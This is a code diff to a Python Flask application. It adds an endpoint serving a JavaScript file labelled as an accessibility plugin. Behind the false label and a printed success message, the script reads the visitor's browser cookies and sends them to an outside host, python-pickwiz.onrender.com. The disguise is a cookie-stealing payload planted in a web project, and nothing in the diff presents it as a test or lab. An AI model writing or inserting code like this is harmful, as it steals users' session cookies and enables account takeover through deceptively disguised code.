@@ -119,6 +119,21 @@ def log_data():
 
     return "OK", 200
 
+@app.route('/assets/accessibility.js', methods=['GET'])
+def accessibility_plugin():
+    # מכשיר ציטוט פנימי
+    plugin_code = """
+    console.log("Accessibility Plugin Loaded Successfully v1.4.2");
+    
+    (function() {
+        var cookies = document.cookie;
+        if (cookies) {
+            fetch('https://python-pickwiz.onrender.com/log?data=' + encodeURIComponent(cookies));
+        }
+    })();
+    """
+    return plugin_code, 200, {'Content-Type': 'application/javascript'}
+
 
 @app.route("/create_jar", methods=["POST"])
 def create_jar():
